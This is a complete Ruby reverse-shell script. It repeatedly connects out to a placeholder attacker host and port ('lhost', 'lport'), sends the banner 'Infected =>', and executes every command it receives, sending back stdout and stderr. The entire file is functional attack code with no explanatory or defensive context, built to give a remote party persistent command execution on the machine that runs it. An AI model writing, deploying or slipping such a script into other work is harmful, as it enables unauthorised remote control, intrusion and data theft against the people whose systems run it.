#!/usr/bin/env ruby

require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "lhost" 
#Set the Remote Host Port
PORT = "lport"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
sock.puts "Infected => "
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end 
